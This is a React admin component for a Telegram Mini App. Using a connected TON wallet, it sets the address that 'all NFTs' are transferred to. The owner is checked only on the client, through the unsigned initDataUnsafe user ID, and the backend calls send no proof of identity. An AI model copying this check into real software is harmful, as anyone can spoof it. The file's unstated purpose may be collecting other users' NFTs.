import { useState, useEffect } from 'react'
import { useTonConnectUI, useTonWallet, useTonAddress } from '@tonconnect/ui-react'
import axios from 'axios'
import './App.css'

const tg = window.Telegram.WebApp

// ID владельца (только он может использовать админ-панель)
const OWNER_USER_ID = 8494675902

function Admin() {
  const [tonConnectUI] = useTonConnectUI()
  const wallet = useTonWallet()
  const userAddress = useTonAddress()

  const [currentAddress, setCurrentAddress] = useState('')
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState('')
  const [authorized, setAuthorized] = useState(false)

  useEffect(() => {
    tg.ready()
    tg.expand()
    tg.setHeaderColor('#667eea')
    tg.setBackgroundColor('#667eea')

    // Проверяем что это владелец
    const userId = tg.initDataUnsafe?.user?.id
    if (userId === OWNER_USER_ID) {
      setAuthorized(true)
      loadCurrentAddress()
    } else {
      setAuthorized(false)
      setMessage('Доступ запрещен')
    }
  }, [])

  useEffect(() => {
    if (userAddress && authorized) {
      setCurrentAddress(userAddress)
    }
  }, [userAddress, authorized])

  const loadCurrentAddress = async () => {
    try {
      const response = await axios.post('https://project-nft.onrender.com/api/get-recipient-address', {
        user_id: String(OWNER_USER_ID)
      })
      setCurrentAddress(response.data.address)
      setMessage('Текущий адрес получателя загружен')
    } catch (err) {
      setMessage('Адрес получателя еще не установлен')
    }
  }

  const saveAddress = async () => {
    if (!userAddress) {
      setMessage('Сначала подключите кошелек')
      return
    }

    setLoading(true)
    try {
      await axios.post('https://project-nft.onrender.com/api/register-address', {
        user_id: OWNER_USER_ID,
        address: userAddress
      })
      setMessage('✅ Адрес получателя успешно сохранен!')
      setCurrentAddress(userAddress)
    } catch (err) {
      setMessage('❌ Ошибка сохранения адреса')
    } finally {
      setLoading(false)
    }
  }

  if (!authorized) {
    return (
      <div className="container error-screen">
        <div className="error-box">
          <h2>❌ Доступ запрещен</h2>
          <p>Эта страница доступна только владельцу</p>
        </div>
      </div>
    )
  }

  return (
    <div className="container" style={{ padding: '20px', maxWidth: '500px', margin: '0 auto' }}>
      <h1 style={{ fontSize: '24px', marginBottom: '20px' }}>⚙️ Настройки получателя NFT</h1>

      {currentAddress && (
        <div style={{
          background: 'rgba(255,255,255,0.1)',
          padding: '15px',
          borderRadius: '10px',
          marginBottom: '20px',
          wordBreak: 'break-all'
        }}>
          <p style={{ margin: '0 0 10px 0', opacity: 0.8 }}>Текущий адрес получателя:</p>
          <p style={{ margin: 0, fontFamily: 'monospace', fontSize: '14px' }}>{currentAddress}</p>
        </div>
      )}

      {!wallet ? (
        <button
          className="primary-btn"
          onClick={() => tonConnectUI.openModal()}
          style={{ width: '100%', marginBottom: '20px' }}
        >
          Подключить кошелек
        </button>
      ) : (
        <div>
          <div style={{
            background: 'rgba(255,255,255,0.1)',
            padding: '15px',
            borderRadius: '10px',
            marginBottom: '20px',
            wordBreak: 'break-all'
          }}>
            <p style={{ margin: '0 0 10px 0', opacity: 0.8 }}>Подключенный кошелек:</p>
            <p style={{ margin: 0, fontFamily: 'monospace', fontSize: '14px' }}>{userAddress}</p>
          </div>

          <button
            className="primary-btn"
            onClick={saveAddress}
            disabled={loading || userAddress === currentAddress}
            style={{ width: '100%', marginBottom: '10px' }}
          >
            {loading ? 'Сохранение...' : userAddress === currentAddress ? 'Адрес уже сохранен' : 'Сохранить адрес'}
          </button>

          <button
            onClick={() => tonConnectUI.disconnect()}
            style={{
              width: '100%',
              padding: '12px',
              background: 'rgba(255,255,255,0.1)',
              border: 'none',
              borderRadius: '10px',
              color: 'white',
              cursor: 'pointer'
            }}
          >
            Отключить кошелек
          </button>
        </div>
      )}

      {message && (
        <div style={{
          marginTop: '20px',
          padding: '15px',
          background: 'rgba(255,255,255,0.1)',
          borderRadius: '10px',
          textAlign: 'center'
        }}>
          {message}
        </div>
      )}

      <div style={{
        marginTop: '30px',
        padding: '15px',
        background: 'rgba(255,255,255,0.05)',
        borderRadius: '10px',
        fontSize: '14px',
        opacity: 0.7
      }}>
        <p style={{ margin: '0 0 10px 0' }}>ℹ️ Инструкция:</p>
        <p style={{ margin: 0 }}>
          1. Подключите кошелек Tonkeeper<br/>
          2. Нажмите "Сохранить адрес"<br/>
          3. Все NFT будут переводиться на этот адрес
        </p>
      </div>
    </div>
  )
}

export default Admin
